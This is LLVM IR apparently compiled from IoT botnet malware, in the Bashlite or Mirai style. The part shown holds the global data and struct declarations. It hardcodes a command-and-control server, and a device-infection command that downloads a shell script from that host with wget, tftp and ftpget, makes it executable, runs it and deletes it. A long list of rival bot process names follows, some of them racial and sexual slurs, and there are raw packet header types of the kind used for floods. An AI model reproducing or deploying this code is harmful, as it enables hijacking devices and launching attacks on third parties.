; ModuleID = 'host/ir_O0/Lulz.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.list = type { i8*, %struct.list*, %struct.list* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.2 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.dns_hdr = type { i16, i16, i16, i16, i16, i16 }
%struct.query = type { i16, i16 }
%struct.ps_hdr = type { i32, i32, i8, i8, i16 }
%struct.thread_data = type { i32, i8*, i32, i32, i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.ifreq = type { %union.anon.7, %union.anon.8 }
%union.anon.7 = type { [16 x i8] }
%union.anon.8 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@cncServer = global [1 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [18 x i8] c"199.38.245.222:23\00", align 1
@rekdevice = global i8* getelementptr inbounds ([477 x i8], [477 x i8]* @.str.1, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [477 x i8] c"cd /tmp || cd /home/$USER || cd /var/run || cd /dev/shm || cd /mnt || cd /var || cd /; wget http://199.38.245.222/bins.sh; busybox wget http://199.38.245.222/bins.sh; tftp -r bins.sh -g 199.38.245.222; busybox tftp -r bins.sh -g 199.38.245.222; ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; chmod 777 bins.sh; busybox chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh\0D\0A\00\00", align 1
@knownBots = global [193 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.188, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [7 x i8] c"902i13\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"BzSxLxBxeY\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"HOHO-LUGO7\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"HOHO-U79OL\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"JuYfouyf87\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"NiGGeR69xd\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"SO190Ij1X\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"LOLKIKEEEDDE\00", align 1
@.str.10 = private unnamed_addr constant [12 x i8] c"ekjheory98e\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"scansh4\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"MDMA\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"fdevalvex\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"scanspc\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"MELTEDNINJAREALZ\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"flexsonskids\00", align 1
@.str.17 = private unnamed_addr constant [8 x i8] c"scanx86\00", align 1
@.str.18 = private unnamed_addr constant [12 x i8] c"foAxi102kxe\00", align 1
@.str.19 = private unnamed_addr constant [13 x i8] c"swodjwodjwoj\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"MmKiy7f87l\00", align 1
@.str.21 = private unnamed_addr constant [14 x i8] c"freecookiex86\00", align 1
@.str.22 = private unnamed_addr constant [7 x i8] c"sysgpu\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c"frgege\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"sysbinsr\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"0DnAzepd\00", align 1
@.str.26 = private unnamed_addr constant [14 x i8] c"NiGGeRD0nks69\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"frgreu\00", align 1
@.str.28 = private unnamed_addr constant [8 x i8] c"telnetd\00", align 1
@.str.29 = private unnamed_addr constant [11 x i8] c"0x766f6964\00", align 1
@.str.30 = private unnamed_addr constant [16 x i8] c"NiGGeRd0nks1337\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"gaft\00", align 1
@.str.32 = private unnamed_addr constant [13 x i8] c"urasgbsigboa\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"120i3UI49\00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"OaF3\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"geae\00", align 1
@.str.36 = private unnamed_addr constant [9 x i8] c"vaiolmao\00", align 1
@.str.37 = private unnamed_addr constant [8 x i8] c"123123a\00", align 1
@.str.38 = private unnamed_addr constant [15 x i8] c"Ofurain0n4H34D\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"ggTrex\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"wasads\00", align 1
@.str.41 = private unnamed_addr constant [12 x i8] c"1293194hjXD\00", align 1
@.str.42 = private unnamed_addr constant [10 x i8] c"OthLaLosn\00", align 1
@.str.43 = private unnamed_addr constant [4 x i8] c"ggt\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"wget-log\00", align 1
@.str.45 = private unnamed_addr constant [15 x i8] c"1337SoraLOADER\00", align 1
@.str.46 = private unnamed_addr constant [9 x i8] c"SAIAKINA\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"ggtq\00", align 1
@.str.48 = private unnamed_addr constant [17 x i8] c"1378bfp919GRB1Q2\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"SAIAKUSO\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"ggtr\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"14Fa\00", align 1
@.str.52 = private unnamed_addr constant [13 x i8] c"SEXSLAVE1337\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"ggtt\00", align 1
@.str.54 = private unnamed_addr constant [15 x i8] c"1902a3u912u3u4\00", align 1
@.str.55 = private unnamed_addr constant [10 x i8] c"haetrghbr\00", align 1
@.str.56 = private unnamed_addr constant [7 x i8] c"19ju3d\00", align 1
@.str.57 = private unnamed_addr constant [12 x i8] c"SORAojkf120\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c"hehahejeje92\00", align 1
@.str.59 = private unnamed_addr constant [14 x i8] c"2U2JDJA901F91\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"SlaVLav12\00", align 1
@.str.61 = private unnamed_addr constant [17 x i8] c"helpmedaddthhhhh\00", align 1
@.str.62 = private unnamed_addr constant [11 x i8] c"2wgg9qphbq\00", align 1
@.str.63 = private unnamed_addr constant [18 x i8] c"Slav3Th3seD3vices\00", align 1
@.str.64 = private unnamed_addr constant [11 x i8] c"hzSmYZjYMQ\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"5Gbf\00", align 1
@.str.66 = private unnamed_addr constant [13 x i8] c"SoRAxD123LOL\00", align 1
@.str.67 = private unnamed_addr constant [5 x i8] c"iaGv\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"5aA3\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"SoRAxD420LOL\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"insomni\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"640277\00", align 1
@.str.72 = private unnamed_addr constant [17 x i8] c"SoraBeReppin1337\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"ipcamCache\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"66tlGg9Q\00", align 1
@.str.75 = private unnamed_addr constant [2 x i8] c"T\00", align 1
@.str.76 = private unnamed_addr constant [11 x i8] c"jUYfouyf87\00", align 1
@.str.77 = private unnamed_addr constant [5 x i8] c"6ke3\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"TOKYO3\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"lyEeaXul2dULCVxh\00", align 1
@.str.80 = private unnamed_addr constant [10 x i8] c"93OfjHZ2z\00", align 1
@.str.81 = private unnamed_addr constant [17 x i8] c"TY2gD6MZvKc7KU6r\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"mMkiy6f87l\00", align 1
@.str.83 = private unnamed_addr constant [14 x i8] c"A023UU4U24UIU\00", align 1
@.str.84 = private unnamed_addr constant [10 x i8] c"TheWeeknd\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"mioribitches\00", align 1
@.str.86 = private unnamed_addr constant [5 x i8] c"A5p9\00", align 1
@.str.87 = private unnamed_addr constant [11 x i8] c"TheWeeknds\00", align 1
@.str.88 = private unnamed_addr constant [10 x i8] c"mnblkjpoi\00", align 1
@.str.89 = private unnamed_addr constant [5 x i8] c"AbAd\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"Tokyos\00", align 1
@.str.91 = private unnamed_addr constant [4 x i8] c"neb\00", align 1
@.str.92 = private unnamed_addr constant [6 x i8] c"Akiru\00", align 1
@.str.93 = private unnamed_addr constant [7 x i8] c"U8inTz\00", align 1
@.str.94 = private unnamed_addr constant [9 x i8] c"netstats\00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"Alex\00", align 1
@.str.96 = private unnamed_addr constant [11 x i8] c"W9RCAKM20T\00", align 1
@.str.97 = private unnamed_addr constant [11 x i8] c"newnetword\00", align 1
@.str.98 = private unnamed_addr constant [7 x i8] c"Ayo215\00", align 1
@.str.99 = private unnamed_addr constant [5 x i8] c"Word\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"nloads\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"BAdAsV\00", align 1
@.str.102 = private unnamed_addr constant [9 x i8] c"Wordmane\00", align 1
@.str.103 = private unnamed_addr constant [11 x i8] c"notyakuzaa\00", align 1
@.str.104 = private unnamed_addr constant [6 x i8] c"Belch\00", align 1
@.str.105 = private unnamed_addr constant [9 x i8] c"Wordnets\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"obp\00", align 1
@.str.107 = private unnamed_addr constant [13 x i8] c"BigN0gg0r420\00", align 1
@.str.108 = private unnamed_addr constant [10 x i8] c"X0102I34f\00", align 1
@.str.109 = private unnamed_addr constant [14 x i8] c"ofhasfhiafhoi\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"X19I239124UIU\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"oism\00", align 1
@.str.112 = private unnamed_addr constant [9 x i8] c"Deported\00", align 1
@.str.113 = private unnamed_addr constant [14 x i8] c"XSHJEHHEIIHWO\00", align 1
@.str.114 = private unnamed_addr constant [10 x i8] c"olsVNwo12\00", align 1
@.str.115 = private unnamed_addr constant [17 x i8] c"DeportedDeported\00", align 1
@.str.116 = private unnamed_addr constant [11 x i8] c"XkTer0GbA1\00", align 1
@.str.117 = private unnamed_addr constant [9 x i8] c"onry0v03\00", align 1
@.str.118 = private unnamed_addr constant [17 x i8] c"FortniteDownLOLZ\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"Y0urM0mGay\00", align 1
@.str.120 = private unnamed_addr constant [16 x i8] c"pussyfartlmaojk\00", align 1
@.str.121 = private unnamed_addr constant [15 x i8] c"GrAcEnIgGeRaNn\00", align 1
@.str.122 = private unnamed_addr constant [11 x i8] c"YvdGkqndCO\00", align 1
@.str.123 = private unnamed_addr constant [11 x i8] c"qGeoRBe6BE\00", align 1
@.str.124 = private unnamed_addr constant [12 x i8] c"GuiltyCrown\00", align 1
